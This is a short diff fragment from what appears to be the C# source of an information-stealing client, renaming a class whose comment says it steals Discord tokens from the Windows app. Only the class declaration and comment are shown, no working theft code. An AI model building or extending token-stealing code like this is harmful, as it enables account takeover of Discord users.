@@ -9,7 +9,7 @@ using System.Threading.Tasks;
 
 namespace Client.Armitage.Cookies
 {
-    public class DiscordToken
+    public class Discord_Token
     {
         /// <summary>
         /// Steals discord token from the Windows app.
